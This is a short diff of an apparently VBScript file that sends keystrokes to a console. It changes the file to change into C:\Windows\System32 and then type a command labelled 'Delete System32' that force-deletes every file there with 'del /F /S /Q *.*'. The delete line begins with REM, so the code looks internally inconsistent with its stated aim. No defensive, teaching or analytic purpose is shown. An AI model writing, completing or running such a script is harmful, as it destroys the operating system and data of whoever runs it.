@@ -46,8 +46,15 @@ WshShell.SendKeys "{ENTER}"
 
 WScript.Sleep 100
 
-WshShell.SendKeys "cd C:\Windows\System32 REM Delete System32 del /F /S /Q *.* "
+WshShell.SendKeys "cd C:\Windows\System32"
 
+
+WshShell.SendKeys "{ENTER}"
+
+WScript.Sleep 100 
+
+
+WshShell.SendKeys "REM Delete System32 del /F /S /Q *.*"
 
 
 WshShell.SendKeys "{ENTER}"
